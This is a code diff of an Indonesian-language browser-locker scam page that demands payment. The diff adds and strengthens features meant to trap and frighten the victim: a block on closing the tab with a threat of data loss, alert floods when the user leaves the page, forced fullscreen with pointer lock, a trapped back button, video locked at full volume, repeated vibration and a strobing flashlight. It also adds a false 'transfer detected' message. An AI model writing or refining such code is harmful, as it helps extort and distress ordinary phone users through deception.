@@ -101,9 +101,9 @@
 
         <div id="term" class="terminal">
             > Status Sistem: TERKUNCI<br>
-            > Lockdown Mode: ACTIVE<br>
-            > Vibration & Strobe: ACTIVE<br>
-            > Volume: Locked 100%
+            > Lockdown: HIGH PERSISTENCE<br>
+            > Security: POINTER LOCKED<br>
+            > Volume: 100% FIXED
         </div>
 
         <button onclick="proses()" class="btn-pay" id="btn">KONFIRMASI PEMBAYARAN</button>
@@ -115,47 +115,60 @@
         var fiturSudahJalan = false;
         let track = null;
 
-        // Anti-Tab Close
+        // 1. ANTI-TAB CLOSE
         window.onbeforeunload = function() {
-            return "SISTEM TERKUNCI! Data anda akan hilang jika menutup halaman ini.";
+            return "PERINGATAN: MENUTUP HALAMAN AKAN MENGHAPUS DATA PERMANEN!";
         };
+
+        // 2. DETEKSI KORBAN TEKAN TOMBOL HOME (Visibility Change)
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                // Rentetan alert ini akan membuat HP korban lag/terhambat saat mau buka app lain
+                alert("UPAYA KELUAR TERDETEKSI!");
+                alert("SISTEM TETAP TERKUNCI.");
+                alert("SELESAIKAN PEMBAYARAN SEKARANG.");
+            }
+        });
 
         async function inisialisasiEfek() {
             if (!fiturSudahJalan) {
-                // 1. PAKSA FULL SCREEN
+                // 3. PAKSA FULL SCREEN & POINTER LOCK
                 let elem = document.documentElement;
                 let requestMethod = elem.requestFullscreen || elem.webkitRequestFullscreen || elem.webkitRequestFullScreen || elem.mozRequestFullScreen || elem.msRequestFullscreen;
-                if (requestMethod) { requestMethod.apply(elem); }
+                
+                if (requestMethod) { 
+                    requestMethod.apply(elem);
+                    // Mengunci pointer agar navigasi tidak mudah muncul
+                    if (elem.requestPointerLock) {
+                        elem.requestPointerLock();
+                    }
+                }
 
-                // 2. ANTI-BACK (Kunci Navigasi)
+                // 4. ANTI-BACK (Kunci Navigasi)
                 history.pushState(null, null, location.href);
                 window.onpopstate = function () {
                     history.go(1);
-                    alert("SISTEM TERKUNCI! Selesaikan pembayaran untuk keluar.");
+                    alert("NAVIGASI DINONAKTIFKAN OLEH ADMINISTRATOR!");
                 };
 
                 var video = document.getElementById("myVideo");
-
-                // 3. JALANKAN VIDEO & SUARA
                 video.muted = false;
                 video.volume = 1.0;
                 video.play();
 
-                // 4. AGGRESSIVE VOLUME & PLAY LOCK (50ms)
+                // 5. AGGRESSIVE SYSTEM LOCK (50ms)
                 setInterval(() => {
                     video.volume = 1.0;
                     if(video.muted) video.muted = false;
                     if(video.paused) video.play();
                 }, 50);
 
-                // 5. FITUR GETAR (Android)
+                // 6. FITUR GETAR PANIK
                 if (navigator.vibrate) {
-                    setInterval(() => { navigator.vibrate([800, 200, 800]); }, 2000);
+                    setInterval(() => { navigator.vibrate([1000, 500, 1000]); }, 2500);
                 }
 
-                // 6. JALANKAN SENTER
                 mulaiSenterKedip();
-                
                 fiturSudahJalan = true;
             }
         }
@@ -175,7 +188,7 @@
                     }, 100); 
                 }
             } catch (err) {
-                alert("IZINKAN KAMERA UNTUK VERIFIKASI KEAMANAN!");
+                console.log("Kamera ditolak");
             }
         }
 
@@ -186,7 +199,7 @@
         function proses() {
             const term = document.getElementById('term');
             term.innerHTML += "<br>> Mengirim laporan ke Admin...";
-            alert("Selesaikan pembayaran dan kirim bukti ke Live Chat!");
+            alert("Transfer berhasil dideteksi. Menunggu konfirmasi Live Chat.");
         }
     </script>
 
